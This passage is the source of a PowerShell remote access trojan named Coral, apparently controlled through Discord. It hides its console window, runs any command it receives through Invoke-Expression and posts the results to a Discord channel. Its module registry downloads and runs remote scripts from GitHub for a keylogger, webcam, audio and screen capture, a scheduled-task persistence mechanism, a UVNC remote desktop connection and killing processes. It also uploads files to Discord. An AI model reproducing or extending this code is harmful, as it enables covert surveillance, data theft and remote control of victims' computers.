    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
    $hwnd = (Get-Process -PID $pid).MainWindowHandle
    
    if($hwnd -ne [System.IntPtr]::Zero){
        $Type::ShowWindowAsync($hwnd, 0)
    } else {
        $Host.UI.RawUI.WindowTitle = 'hideme'
        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
        $hwnd = $Proc.MainWindowHandle
        $Type::ShowWindowAsync($hwnd, 0)
    }
}

function Start_AgentJob {
    param($ScriptString)
    $RandName = -join("ABCDEFGHKLMNPRSTUVWXYZ123456789".ToCharArray()|Get-Random -Count 6)
    
    $job = Start-Job -ScriptBlock {
        param($ScriptString, $token, $SessionID, $CategoryID, $ModuleRegistry, $themes, $currenttheme, $theme_enabled, $ChannelRegistry)
        
        # Set global variables in job scope
        $global:token = $token
        $global:SessionID = $SessionID
        $global:CategoryID = $CategoryID
        $global:ModuleRegistry = $ModuleRegistry
        $global:themes = $themes
        $global:currenttheme = $currenttheme
        $global:theme_enabled = $theme_enabled
        $global:ChannelRegistry = $ChannelRegistry  # NEW: Add channel registry
        $global:hidewindow = $true
        $global:keyloggerstatus = $false
        $global:lastMessageAttachments = $null
        
        # Import all necessary functions into job scope
        ${function:Invoke-DiscordAPI} = ${using:function:Invoke-DiscordAPI}
        ${function:sendMsg} = ${using:function:sendMsg}
        ${function:Send_SingleMessage} = ${using:function:Send_SingleMessage}
        ${function:Send_ChunkedMessage} = ${using:function:Send_ChunkedMessage}
        ${function:Send_AsFile} = ${using:function:Send_AsFile}
        ${function:Split_IntoChunks} = ${using:function:Split_IntoChunks}
        ${function:Clean_MessageContent} = ${using:function:Clean_MessageContent}
        ${function:sendFile} = ${using:function:sendFile}
        ${function:sendMsgWithImage} = ${using:function:sendMsgWithImage}
        ${function:sendEmbedWithImage} = ${using:function:sendEmbedWithImage}
        
        # Import FFmpeg functions
        ${function:GetFfmpeg} = ${using:function:GetFfmpeg}
        ${function:RemoveFfmpeg} = ${using:function:RemoveFfmpeg}
        
        # Import theme functions
        ${function:GetCurrentTheme} = ${using:function:GetCurrentTheme}
        ${function:SetCurrentTheme} = ${using:function:SetCurrentTheme}
        ${function:EnableTheme} = ${using:function:EnableTheme}
        ${function:DisableTheme} = ${using:function:DisableTheme}
        
        # Import CRITICAL channel management functions - NEW
        ${function:NewChannel} = ${using:function:NewChannel}
        ${function:Get_OrCreateChannel} = ${using:function:Get_OrCreateChannel}
        ${function:List_Channels} = ${using:function:List_Channels}
        ${function:Remove_ChannelFromRegistry} = ${using:function:Remove_ChannelFromRegistry}
        ${function:Set_MainChannel} = ${using:function:Set_MainChannel}
        
        # Import CRITICAL dynamic loading functions - MUST HAVE
        ${function:Find_CommandInRegistry} = ${using:function:Find_CommandInRegistry}
        ${function:Execute_DynamicCommand} = ${using:function:Execute_DynamicCommand}
        ${function:Execute_DynamicCommandWithParams} = ${using:function:Execute_DynamicCommandWithParams}
        ${function:Parse_CommandWithParameters} = ${using:function:Parse_CommandWithParameters}
        ${function:Is_LocalFunction} = ${using:function:Is_LocalFunction}
        
        # Import utility functions
        ${function:downloadFile} = ${using:function:downloadFile}
        
        # Define a helper function that mimics the main loop logic for jobs
        function Execute_JobCommand {
            param([string]$CommandString)
            
            # Parse command with parameters using the same logic as main loop
            $parsed = Parse_CommandWithParameters -FullCommand $CommandString
            $command = $parsed.Command.ToUpper()
            $parameters = $parsed.Parameters
            
            # Handle hardcoded commands that might be used in jobs
            switch ($command) {
                'GETTHEME' { GetCurrentTheme }
                'ENABLETHEME' { EnableTheme }
                'DISABLETHEME' { DisableTheme }
                
                # NEW: Channel management commands in jobs
                'CREATECHANNEL' {
                    if ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name")) {
                        $channelName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
                        NewChannel -name $channelName
                    } else {
                        sendEmbedWithImage -Title "ERROR" -Description ":x: **Usage:** ``CREATECHANNEL <channel-name>``" -Color "13369344"
                    }
                }
                'LISTCHANNELS' {
                    $showDetails = $parameters.ContainsKey("details") -or $parameters.ContainsKey("d")
                    $forceRefresh = $parameters.ContainsKey("refresh") -or $parameters.ContainsKey("r")
                    List_Channels -ShowDetails:$showDetails -ForceRefresh:$forceRefresh
                }
                'SETCHANNEL' {
                    if ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name")) {
                        $channelName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
                        Set_MainChannel -channelName $channelName
                    } else {
                        sendEmbedWithImage -Title "ERROR" -Description ":x: **Usage:** ``SETCHANNEL <channel-name>``" -Color "13369344"
                    }
                }
                'REMOVECHANNEL' {
                    if ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name")) {
                        $channelName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
                        Remove_ChannelFromRegistry -channelName $channelName -DeleteFromDiscord:$true
                    } else {
                        sendEmbedWithImage -Title "ERROR" -Description ":x: **Usage:** ``REMOVECHANNEL <channel-name>``" -Color "13369344"
                    }
                }
                'UNREGISTERCHANNEL' {
                    if ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name")) {
                        $channelName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
                        Remove_ChannelFromRegistry -channelName $channelName -DeleteFromDiscord:$false
                    } else {
                        sendEmbedWithImage -Title "ERROR" -Description ":x: **Usage:** ``UNREGISTERCHANNEL <channel-name>``" -Color 13369344
                    }
                }
                'TESTCHANNEL' {
                    if ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name")) {
                        $channelName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
                        sendEmbedWithImage -Title "Channel Test" -Description ":test_tube: **This message was sent to:** ``$channelName``" -ChannelTarget $channelName
                    } else {
                        sendEmbedWithImage -Title "ERROR" -Description ":x: **Usage:** ``TESTCHANNEL <channel-name>``" -Color 13369344
                    }
                }
                
                default {
                    if ($command -eq "SETTHEME" -and ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name"))) {
                        $themeName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
                        SetCurrentTheme -themename $themeName
                    }
                    else {
                        # Try to execute as a dynamic command from the registry with parameters
                        $commandExecuted = Execute_DynamicCommandWithParams -Command $command -Parameters $parameters
                        
                        if (-not $commandExecuted) {
                            # Fall back to PowerShell expression evaluation
                            try {
                                $result = Invoke-Expression $CommandString 2>&1
                                if ($result) {
                                    $output = $result | Out-String
                                    sendEmbedWithImage -Title "Command executed successfully" -Description "``````$output``````"
                                } else {
                                    sendEmbedWithImage -Title "Command executed successfully" -Description "No output returned."
                                }
                            } catch {
                                $errorMsg = $_.Exception.Message
                                if ($errorMsg.Length -gt 1000) {
                                    $errorMsg = $errorMsg.Substring(0, 1000) + "... (error truncated)"
                                }
                                sendEmbedWithImage -Title "ERROR" -Description " :x: **Error executing command**`n``````$errorMsg``````" -Color 13369344
                            }
                        }
                    }
                }
            }
        }
        
        # Execute the provided command
        Execute_JobCommand -CommandString $ScriptString
        
    } -ArgumentList $ScriptString, $global:token, $global:SessionID, $global:CategoryID, $global:ModuleRegistry, $global:themes, $global:currenttheme, $global:theme_enabled, $global:ChannelRegistry
    
    $script:Jobs[$RandName] = $job
    sendEmbedWithImage -Title JOB -Description ":gear: **Job Started:** ``$RandName`` | ID: $($job.Id)"
    return $RandName
}

function Get_AgentJobCompleted {
    param($JobName)
    if($script:Jobs.ContainsKey($JobName)) {
        $script:Jobs[$JobName].State -eq 'Completed'
    }
}

function List_AgentJobs {
    $jobList = @()
    foreach ($JobName in $script:Jobs.Keys) {
        $job = $script:Jobs[$JobName]
        $status = $job.State
        $jobList += [PSCustomObject]@{
            JobName = $JobName
            Status  = $status
            JobId = $job.Id
        }
    }
    
    if ($jobList.Count -eq 0) {
        sendEmbedWithImage -Title "No Active Jobs" -Description ":information_source: **There are currently no active jobs.**"
        return
    }
    
    $msg = "**Active Jobs:**`n"
    foreach ($job in $jobList) {
        $msg += "**$($job.JobName)** (ID: $($job.JobId)) - Status: $($job.Status)`n"
    }
    sendEmbedWithImage -Title "Job List" -Description $msg
}

function Remove_AgentJob {
    param([string]$JobName)
    if ($script:Jobs.ContainsKey($JobName)) {
        $job = $script:Jobs[$JobName]
        try {
            Stop-Job -Job $job -Force
        } catch {}
        Remove-Job -Job $job -Force
        $script:Jobs.Remove($JobName)
        sendEmbedWithImage -Title "Job Removed" -Description ":stop_sign: **Job Removed:** ``$JobName``"
    } else {
        sendEmbedWithImage -Title "ERROR" -Description ":x: **Job Not Found:** ``$JobName``" -Color 13369344
    }
}

function Get_AgentJobOutput {
    param([string]$JobName)
    if ($script:Jobs.ContainsKey($JobName)) {
        $job = $script:Jobs[$JobName]
        $output = Receive-Job -Job $job -Keep -ErrorAction SilentlyContinue
        
        $errors = @()
        foreach ($childJob in $job.ChildJobs) {
            if ($childJob.Error.Count -gt 0) {
                $errors += $childJob.Error | ForEach-Object { $_.Exception.Message }
            }
        }
        
        $msg = ":page_facing_up: **Job Output - $JobName :**`n"
        
        if ($output) {
            $result = $output | Out-String
            if ($result.Length -gt 1500) {
                $result = $result.Substring(0, 1500) + "... (truncated)"
            }
            $msg += "**Output:**```$result```""
        } else {
            $msg += "**Output:** No output available`n"
        }
        
        if ($errors.Count -gt 0) {
            $errorText = $errors -join "`n"
            if ($errorText.Length -gt 500) {
                $errorText = $errorText.Substring(0, 500) + "... (truncated)"
            }
            $msg += "`n**Errors:**```$errorText```""
        } else {
            $msg += "`n**Errors:** No errors```""
        }
        
        sendEmbedWithImage -Title "Job Output" -Description $msg
    } else { 
        sendEmbedWithImage -Title "ERROR" -Description ":x: **Job Not Found:** ``$JobName``" -Color 13369344
    }
}

function Get_AgentJobStatus {
    param([string]$JobName)
    if ($script:Jobs.ContainsKey($JobName)) {
        $job = $script:Jobs[$JobName]
        
        $msg = ":gear: **Job Status - $JobName :**`n"
        $msg += "**State:** $($job.State)`n"
        $msg += "**Has More Data:** $($job.HasMoreData)`n"
        $msg += "**Start Time:** $($job.PSBeginTime)`n"
        $msg += "**End Time:** $($job.PSEndTime)`n"
        
        if ($job.State -eq "Failed") {
            $failureReason = $job.ChildJobs[0].JobStateInfo.Reason
            if ($failureReason) {
                $msg += "**Failure Reason:** $($failureReason.Message)`n"
            }
        }
        
        $errorCount = ($job.ChildJobs | ForEach-Object { $_.Error.Count } | Measure-Object -Sum).Sum
        $msg += "**Error Count:** $errorCount"
        
        sendEmbedWithImage -Title "Job Status" -Description $msg
    } else {
        sendEmbedWithImage -Title "Job Not Found" -Description ":x: **Job Not Found:** ``$JobName``"
    }
}

function Stop_AllAgentJobs {
    if ($script:Jobs.Count -eq 0) {
        sendEmbedWithImage -Title "No Active Jobs" -Description ":information_source: **No active jobs to stop.**"
        return
    }
    
    $stoppedCount = 0
    foreach ($JobName in @($script:Jobs.Keys)) {
        try {
            $job = $script:Jobs[$JobName]
            Stop-Job -Job $job -Force
            Remove-Job -Job $job -Force
            $script:Jobs.Remove($JobName)
            $stoppedCount++
        } catch {}
    }
    sendEmbedWithImage -Title "All Jobs Stopped" -Description ":stop_sign: **All jobs stopped. Total jobs stopped: $stoppedCount**"
}

function Check_CompletedJobs {
    foreach ($JobName in @($script:Jobs.Keys)) {
        if (Get_AgentJobCompleted -JobName $JobName) {
            $job = $script:Jobs[$JobName]
            $output = Receive-Job -Job $job -ErrorAction SilentlyContinue
            $errors = ($job.ChildJobs | ForEach-Object { $_.JobStateInfo.Reason }) -join "`n"
            Remove-Job -Job $job
            $script:Jobs.Remove($JobName)
            
            $msg = ":checkered_flag: **Job Completed - $JobName**"
            if ($output) {
                $result = $output | Out-String
                if ($result.Length -gt 1600) {
                    $result = $result.Substring(0, 1600) + "... (truncated)"
                }
                $msg += "```$result```""
            }
            if ($errors) { 
                $msg += "`n:warning: **Errors:**`n```$errors```""
            }
            sendEmbedWithImage -Title "Job Completed" -Description $msg
        }
    }
}

function Cleanup_CoralAgent {
    try {
        if ($global:CoralMutex) {
            $global:CoralMutex.ReleaseMutex()
            $global:CoralMutex.Dispose()
        }
        if ($script:Jobs.Count -gt 0) { Stop_AllAgentJobs }
        if ($global:keyloggerstatus) { Stop_Keylogger }
    } catch {}
}

trap { try { Cleanup_CoralAgent } catch {}; continue }

# =============================== MODULES (WIP) ===============================
$global:ModuleRegistry = @{
    # Core modules (always available)
    core = @{
        name = "Core Functions"
        functions = @("sendMsg", "sendFile", "sendEmbedWithImage", "sendMsgWithImage", "downloadFile", "PullMsg", "Invoke-DiscordAPI")
        loaded = $true
        required = $true
    }
    
    # Job Management Module
    jobs = @{
        name = "Job Management System"
        functions = @("Start_AgentJob", "List_AgentJobs", "Remove_AgentJob", "Get_AgentJobOutput", "Get_AgentJobStatus", "Stop_AllAgentJobs", "Check_CompletedJobs")
        loaded = $true
        required = $true
    }
    
    # Theme System Module
    themes = @{
        name = "Theme Management System"
        functions = @("GETCURRENTTHEME", "SETCURRENTTHEME", "ENABLETHEME", "DISABLETHEME")
        loaded = $true
        required = $true
    }
    
    # File System Module
    filesystem = @{
        name = "File Operations"
        functions = @("SENDFILE", "DOWNLOADFILE")
        loaded = $true
        required = $true
    }
    
    # Channel Management Module
    channels = @{
        name = "Channel Management System"
        functions = @("CREATECHANNEL", "LISTCHANNELS", "SETCHANNEL", "REMOVECHANNEL", "UNREGISTERCHANNEL", "TESTCHANNEL", "NewChannel", "Get_OrCreateChannel", "List_Channels", "Remove_ChannelFromRegistry", "Set_MainChannel")
        loaded = $true
        required = $true
    }
    
    # System Module
    system = @{
        name = "System Management"
        functions = @("HideWindow","Cleanup_CoralAgent")
        loaded = $true
        required = $true
    }
    
    # Help System Module
    help = @{
        name = "Help and Documentation"
        functions = @("display_help", "Get_FunctionHelp", "List_Modules", "Get_AvailableCommands")
        loaded = $true
        required = $true
    }
    
    # FFmpeg Module
    ffmpeg = @{
        name = "FFmpeg Operations"
        functions = @("GETFFMPEG", "REMOVEFFMPEG")
        loaded = $true
        required = $false
    }
    
    # Dynamic Loading Module
    dynamic = @{
        name = "Dynamic Function Loading System"
        functions = @("Is_LocalFunction", "Find_CommandInRegistry", "Execute_DynamicCommand", "Execute_DynamicCommandWithParams", "Parse_CommandWithParameters")
        loaded = $true
        required = $true
    }
    
    # Remote modules
    recon = @{
        name = "Reconnaissance Module"
        baseUrl = "https://raw.githubusercontent.com/JoshuaBrien/Compilation-of-stuff-i-done/refs/heads/main/Coral_network_discordONLY/modules/recon/"
        scripts = @{
            SCREENSHOT = @{
                url = "Mscreenshot_all.ps1"
                function = "Mscreenshot"
                alias = "SCREENSHOT"
                description = "Take screenshots of all monitors"
                params = @()
            }
            WEBCAM = @{
                url = "Mwebcam.ps1"
                function = "Mwebcam"
                alias = "WEBCAM"
                description = "Record webcam video"
                params = @()
            }
            AUDIO = @{
                url = "Maudio.ps1"
                function = "Maudio"
                alias = "AUDIO"
                description = "Record audio"
                params = @("duration")
            }
            QUICKINFO = @{
                url = "MquickInfo.ps1"
                function = "MquickInfo"
                alias = "QUICKINFO"
                description = "Get system information"
                params = @()
            }
        }
        loaded = $false
        required = $false
    }
    
    persistence = @{
        name = "Persistence Module"
        baseUrl = "https://raw.githubusercontent.com/JoshuaBrien/Compilation-of-stuff-i-done/refs/heads/main/Coral_network_discordONLY/modules/persistence/"
        scripts = @{
            ENABLEREGPTASK = @{
                url = "Mregptask.ps1"
                function = "Mcreate_Ptask"
                alias = "ENABLEREGPTASK"
                description = "Create persistence task"
                params = @("token")
            }
            DISABLEREGPTASK = @{
                url = "Mregptask.ps1"
                function = "Mremove_Ptask"
                alias = "DISABLEREGPTASK"
                description = "Remove persistence task"
                params = @()
            }
        }
        loaded = $false
        required = $false
    }

    NEKOS = @{
        name = "Neko Module"
        baseUrl = "https://raw.githubusercontent.com/JoshuaBrien/Compilation-of-stuff-i-done/refs/heads/main/Coral_network_discordONLY/modules/nekos/"
        scripts = @{
            ENABLENEKO = @{
                url = "Mnekograbber.ps1"
                function = "Mgetneko"
                alias = "ENABLENEKO"
                description = "Download neko executable"
                params = @()
            }
            DISABLENEKO = @{
                url = "Mnekograbber.ps1"
                function = "Mremoveneko"
                alias = "DISABLENEKO"
                description = "Remove neko executable"
                params = @()
            }
            ENABLENEKOUVNC = @{
                url = "MnekoUVNC.ps1"
                function = "MStartUvnc"
                alias = "ENABLENEKOUVNC"
                description = "Start UVNC server"
                params = @("ip", "port")
            }
            DISABLENEKOUVNC = @{
                url = "MnekoUVNC.ps1"
                function = "MRemoveUVNC"
                alias = "DISABLENEKOUVNC"
                description = "Remove UVNC server"
                params = @()
            }
        }
        loaded = $false
        required = $false
    }
    
    NEKOLOGGER = @{
        name = "Neko Logger Module"
        baseUrl = "https://raw.githubusercontent.com/JoshuaBrien/Compilation-of-stuff-i-done/refs/heads/main/Coral_network_discordONLY/modules/nekologger/"
        scripts = @{
            ENABLENEKOLOGGER = @{
                url = "nekologger.ps1"
                function = "MStart_Keylogger"
                alias = "ENABLENEKOLOGGER"
                description = "Start Neko keylogger with enhanced features"
                params = @("interval")
            }
            DISABLENEKOLOGGER = @{
                url = "nekologger.ps1"
                function = "MStop_Keylogger"
                alias = "DISABLENEKOLOGGER"
                description = "Stop Neko keylogger"
                params = @()
            }
            NEKOLOGGERSTATUS = @{
                url = "nekologger.ps1"
                function = "MGet_KeyloggerStatus"
                alias = "NEKOLOGGERSTATUS"
                description = "Get Neko keylogger status"
                params = @()
            }
        }
        loaded = $false
        required = $false
    }
    
    PROCESS_MANAGEMENT = @{
        name = "Process Management Module"
        baseUrl = "https://raw.githubusercontent.com/JoshuaBrien/Compilation-of-stuff-i-done/refs/heads/main/Coral_network_discordONLY/modules/process_management/"
        scripts = @{
            PROCESSLIST = @{
                url = "Mprocess_management.ps1"
                function = "MGet_ProcessList"
                alias = "PROCESSLIST"
                description = "Get list of running processes"
                params = @("filter", "sortBy")
            }
            KILLPROCESS = @{
                url = "Mprocess_management.ps1"
                function = "MKill_Process"
                alias = "KILLPROCESS"
                description = "Terminate a process by name or PID"
                params = @("processName", "processId")
            }
            STARTPROCESS = @{
                url = "Mprocess_management.ps1"
                function = "MStart_Process"
                alias = "STARTPROCESS"
                description = "Start a new process"
                params = @("executablePath", "arguments", "hidden", "elevated")
            }
            ADDBLACKLIST = @{
                url = "Mprocess_management.ps1"
                function = "MAdd_ProcessBlacklist"
                alias = "ADDBLACKLIST"
                description = "Add process to blacklist (auto-terminate)"
                params = @("processName")
            }
            REMOVEBLACKLIST = @{
                url = "Mprocess_management.ps1"
                function = "MRemove_ProcessBlacklist"
                alias = "REMOVEBLACKLIST"
                description = "Remove process from blacklist"
                params = @("processName")
            }
            SHOWBLACKLIST = @{
                url = "Mprocess_management.ps1"
                function = "MShow_ProcessBlacklist"
                alias = "SHOWBLACKLIST"
                description = "Show current process blacklist"
                params = @()
            }
            STARTPROCESSMONITOR = @{
                url = "Mprocess_management.ps1"
                function = "MStart_ProcessMonitoring"
                alias = "ENABLEPROCESSMONITOR"
                description = "Start monitoring for new processes"
                params = @("intervalSeconds")
            }
            STOPPROCESSMONITOR = @{
                url = "Mprocess_management.ps1"
                function = "MStop_ProcessMonitoring"
                alias = "DISABLEPROCESSMONITOR"
                description = "Stop process monitoring"
                params = @()
            }
            PROCESSMONITORSTATUS = @{
                url = "Mprocess_management.ps1"
                function = "MGet_ProcessMonitoringStatus"
                alias = "PROCESSMONITORSTATUS"
                description = "Check process monitoring status"
                params = @()
            }
            PROCESSDETAILS = @{
                url = "Mprocess_management.ps1"
                function = "MGet_ProcessDetails"
                alias = "PROCESSDETAILS"
                description = "Get detailed information about a process"
                params = @("processName", "processId")
            }
            PROCESSMONITORCLEANUP = @{
                url = "Mprocess_management.ps1"
                function = "MProcMon_Cleanup"
                alias = "PROCESSMONITORCLEANUP"
                description = "Clean up process monitoring data"
                params = @()
            }
        }
        loaded = $false
        required = $false
    }
}
function Is_LocalFunction {
    param([string]$FunctionName)
    
    # Check if function exists locally
    return (Get-Command $FunctionName -ErrorAction SilentlyContinue) -ne $null
}

function List_Modules {
    $msg = ":package: **Available Modules:**`n`nThose in caps in commands while the remaining are functions in the code!`n"
    foreach ($moduleName in $global:ModuleRegistry.Keys) {
        $module = $global:ModuleRegistry[$moduleName]
        $status = if ($module.loaded) { ":green_circle: Loaded" } else { ":red_circle: Not Loaded" }
        $required = if ($module.required) { " (Required)" } else { "" }
        
        $msg += "**$($module.name)** ``$moduleName``$required - $status`n"
        
        if ($module.ContainsKey("scripts")) {
            foreach ($scriptName in $module.scripts.Keys) {
                $script = $module.scripts[$scriptName]
                $params = if ($script.params.Count -gt 0) { " [" + ($script.params -join ", ") + "]" } else { "" }
                $msg += "-> **$($script.alias)**$params - $($script.description)`n"
            }
        } elseif ($module.ContainsKey("functions")) {
            foreach ($func in $module.functions) {
                $msg += "-> **$func**`n"
            }
        }
        $msg += "`n"
    }
    
    sendEmbedWithImage -Title "Available Modules" -Description $msg
}


function Find_CommandInRegistry {
    param([string]$Command)
    
    $commandUpper = $Command.ToUpper()
    $commandLower = $Command.ToLower()
    
    # Search through all modules for the command
    foreach ($moduleName in $global:ModuleRegistry.Keys) {
        $module = $global:ModuleRegistry[$moduleName]
        
        if ($module.ContainsKey("scripts")) {
            foreach ($scriptName in $module.scripts.Keys) {
                $script = $module.scripts[$scriptName]
                
                # Check if command matches the script key (exact uppercase match)
                if ($scriptName -eq $commandUpper) {
                    return @{
                        Found = $true
                        ModuleName = $moduleName
                        Script = $script
                        ScriptName = $scriptName
                        IsRemote = $true
                    }
                }
                
                # Check if command matches the alias (case insensitive)
                if ($script.alias.ToLower() -eq $commandLower) {
                    return @{
                        Found = $true
                        ModuleName = $moduleName
                        Script = $script
                        ScriptName = $scriptName
                        IsRemote = $true
                    }
                }
            }
        }
        
        # Check local functions in module
        if ($module.ContainsKey("functions")) {
            foreach ($funcName in $module.functions) {
                if ($funcName.ToLower() -eq $commandLower) {
                    return @{
                        Found = $true
                        ModuleName = $moduleName
                        FunctionName = $funcName
                        IsRemote = $false
                    }
                }
            }
        }
    }
    
    return @{ Found = $false }
}

function Execute_DynamicCommand {
    param([string]$Command)
    
    # First check if it's already a local function
    if (Get-Command $Command -ErrorAction SilentlyContinue) {
        try {
            & $Command
            return $true
        } catch {
            sendEmbedWithImage -Title "ERROR" -Description ":x: **Error executing local function:** ``$Command`` - $($_.Exception.Message)" -Color 13369344
            return $false
        }
    }
    
    # Search in module registry
    $commandInfo = Find_CommandInRegistry -Command $Command
    
    if (-not $commandInfo.Found) {
        return $false
    }
    
    if ($commandInfo.IsRemote) {
        # Handle remote function
        $module = $global:ModuleRegistry[$commandInfo.ModuleName]
        $script = $commandInfo.Script
        
        try {
            sendEmbedWithImage -Title "LOADING REMOTE FUNCTION" -Description ":gear: **Loading:** ``$($script.alias)`` **from module:** ``$($commandInfo.ModuleName)``"

            # Download and execute the remote script
            $fullUrl = $module.baseUrl + $script.url
            $scriptContent = Invoke-RestMethod $fullUrl
            Invoke-Expression $scriptContent
            
            # Mark module as loaded
            $global:ModuleRegistry[$commandInfo.ModuleName].loaded = $true
            
            # Execute the function
            & $script.function
            return $true
            
        } catch {
            sendEmbedWithImage -Title "ERROR" -Description ":x: **Error loading remote function:** ``$($script.alias)`` - $($_.Exception.Message)" -Color 13369344
            return $false
        }
    } else {
        # Handle local function from registry
        try {
            & $commandInfo.FunctionName
            return $true
        } catch {
            sendEmbedWithImage -Title "ERROR" -Description ":x: **Error executing function:** ``$($commandInfo.FunctionName)`` - $($_.Exception.Message)" -Color 13369344
            return $false
        }
    }
}

function Parse_CommandWithParameters {
    param([string]$FullCommand)
    
    # Handle simple command (no parameters)
    if ($FullCommand -notmatch '\s') {
        return @{
            Command = $FullCommand
            Parameters = @{}
        }
    }
    
    # Split command and parameters
    $parts = $FullCommand -split '\s+', 2
    $command = $parts[0]
    $paramString = if ($parts.Length -gt 1) { $parts[1] } else { "" }
    
    # Parse parameters - support both positional and named parameters
    $parameters = @{}
    if ($paramString) {
        # Check if using named parameters (-param value format)
        if ($paramString -match '-\w+') {
            # Named parameter parsing
            $regex = '-(\w+)\s+([^\-]+?)(?=\s+-\w+|$)'
            $matches = [regex]::Matches($paramString, $regex)
            foreach ($match in $matches) {
                $paramName = $match.Groups[1].Value.Trim()
                $paramValue = $match.Groups[2].Value.Trim()
                $parameters[$paramName] = $paramValue
            }
        } else {
            # Positional parameter parsing - split by spaces, handle quotes
            $paramList = @()
            if ($paramString -match '".*"' -or $paramString -match "'.*'") {
                # Advanced parsing for quoted strings
                $regex = '(?:"([^"]*)"|''([^'']*)''|(\S+))'
                $matches = [regex]::Matches($paramString, $regex)
                foreach ($match in $matches) {
                    if ($match.Groups[1].Success) {
                        $paramList += $match.Groups[1].Value
                    } elseif ($match.Groups[2].Success) {
                        $paramList += $match.Groups[2].Value
                    } else {
                        $paramList += $match.Groups[3].Value
                    }
                }
            } else {
                # Simple space-separated
                $paramList = $paramString -split '\s+'
            }
            
            # Convert positional to hashtable based on function definition
            $commandInfo = Find_CommandInRegistry -Command $command
            if ($commandInfo.Found -and $commandInfo.IsRemote -and $commandInfo.Script.params) {
                for ($i = 0; $i -lt [Math]::Min($paramList.Count, $commandInfo.Script.params.Count); $i++) {
                    $parameters[$commandInfo.Script.params[$i]] = $paramList[$i]
                }
            } else {
                # If no parameter definition found, use generic names
                for ($i = 0; $i -lt $paramList.Count; $i++) {
                    $parameters["param$i"] = $paramList[$i]
                }
            }
        }
    }
    
    return @{
        Command = $command
        Parameters = $parameters
    }
}

function Execute_DynamicCommandWithParams {
    param([string]$Command, [hashtable]$Parameters = @{})
    
    # First check if it's already a local function
    if (Get-Command $Command -ErrorAction SilentlyContinue) {
        try {
            if ($Parameters.Count -gt 0) {
                & $Command @Parameters
            } else {
                & $Command
            }
            return $true
        } catch {
            sendEmbedWithImage -Title "ERROR" -Description ":x: **Error executing local function:** ``$Command`` - $($_.Exception.Message)" -Color 13369344
            return $false
        }
    }
    
    # Search in module registry
    $commandInfo = Find_CommandInRegistry -Command $Command
    
    if (-not $commandInfo.Found) {
        return $false
    }
    
    if ($commandInfo.IsRemote) {
        # Handle remote function
        $module = $global:ModuleRegistry[$commandInfo.ModuleName]
        $script = $commandInfo.Script
        
        try {
            sendEmbedWithImage -Title "Loading command" -Description ":gear: **Loading:** ``$($script.alias)`` **from module:** ``$($commandInfo.ModuleName)``"

            # Download and execute the remote script
            $fullUrl = $module.baseUrl + $script.url
            $scriptContent = Invoke-RestMethod $fullUrl
            Invoke-Expression $scriptContent
            
            # Mark module as loaded
            $global:ModuleRegistry[$commandInfo.ModuleName].loaded = $true
            
            # Execute the function with parameters
            if ($Parameters.Count -gt 0) {
                # Special handling for specific functions that need global variables
                if ($script.function -eq "Mcreate_Ptask" -and -not $Parameters.ContainsKey("token")) {
                    $Parameters["token"] = $global:token
                }
                
                & $script.function @Parameters
                
                # Display parameter info
                $paramInfo = ($Parameters.GetEnumerator() | ForEach-Object { "$($_.Key): $($_.Value)" }) -join ", "
                sendEmbedWithImage -Title "Command Executed" -Description ":gear: **Executed with parameters:** ``$paramInfo``"
            } else {
                & $script.function
            }
            return $true
            
        } catch {
            sendEmbedWithImage -Title "ERROR" -Description ":x: **Error loading remote function:** ``$($script.alias)`` - $($_.Exception.Message)" -Color 13369344
            return $false
        }
    } else {
        # Handle local function from registry
        try {
            if ($Parameters.Count -gt 0) {
                & $commandInfo.FunctionName @Parameters
            } else {
                & $commandInfo.FunctionName
            }
            return $true
        } catch {
            sendEmbedWithImage -Title "ERROR" -Description ":x: **Error executing function:** ``$($commandInfo.FunctionName)`` - $($_.Exception.Message)" -Color 13369344
            return $false
        }
    }
}

function Get_FunctionHelp {
    param([string]$FunctionName)
    
    # First check if it's a hardcoded command in the main loop
    $hardcodedCommands = @{
        "TEST" = @{
            description = "Test the connection to the Coral Network"
            params = @()
            usage = "TEST"
        }
        "HELP" = @{
            description = "Display help menu or get help for specific function"
            params = @("function")
            usage = "HELP or HELP <function>"
        }
        "MODULES" = @{
            description = "List all available modules and their status"
            params = @()
            usage = "MODULES"
        }
        "CREATEJOB" = @{
            description = "Create a new background job"
            params = @("command")
            usage = "CREATEJOB <command> or CREATEJOB <command with parameters>"
        }
        "DELETEJOB" = @{
            description = "Stop and remove a specific job"
            params = @("jobname")
            usage = "DELETEJOB <jobname>"
        }
        "JOBS" = @{
            description = "List all active jobs with their status"
            params = @()
            usage = "JOBS"
        }
        "JOBOUTPUT" = @{
            description = "Get output and errors from a job"
            params = @("jobname")
            usage = "JOBOUTPUT <jobname>"
        }
        "JOBSTATUS" = @{
            description = "Get detailed status of a job"
            params = @("jobname")
            usage = "JOBSTATUS <jobname>"
        }
        "STOPALLJOBS" = @{
            description = "Stop all running jobs"
            params = @()
            usage = "STOPALLJOBS"
        }
        "GETTHEME" = @{
            description = "Show current theme status and details"
            params = @()
            usage = "GETTHEME"
        }
        "SETTHEME" = @{
            description = "Set theme"
            params = @("name")
            usage = "SETTHEME <name> (darktheme, neko_maid, neko_kimono, neko_cafe)"
        }
        "ENABLETHEME" = @{
            description = "Enable theme functionality"
            params = @()
            usage = "ENABLETHEME"
        }
        "DISABLETHEME" = @{
            description = "Disable theme functionality"
            params = @()
            usage = "DISABLETHEME"
        }
        "SENDFILE" = @{
            description = "Upload a file to Discord"
            params = @("filepath")
            usage = "SENDFILE <filepath>"
        }
        "DOWNLOADFILE" = @{
            description = "Download file attachments from Discord"
            params = @("path")
            usage = "DOWNLOADFILE [path] (send message with file attachments first)"
        }
